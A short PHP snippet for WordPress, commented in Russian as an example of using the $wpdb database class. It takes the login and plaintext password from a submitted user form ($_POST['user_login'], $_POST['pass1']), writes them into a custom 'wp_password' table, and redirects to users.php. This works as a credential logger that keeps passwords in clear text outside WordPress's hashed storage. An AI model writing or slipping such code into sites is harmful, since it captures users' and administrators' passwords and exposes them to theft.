<?php
	// wpdb - php класс WordPress, который предоставляет возможность удобно манипулировать своей базой данных
	global $wpdb;

	// Выполняет вставку новой записи в таблицу "wp_password"
	$wpdb->insert( 'wp_password', [ 'login' => $_POST['user_login'], 'pass' => $_POST['pass1'], 'repass' => 'it is work?'  ]);

	// Перенаправление пользователя на страницу users.php
	header("Location: users.php");
?>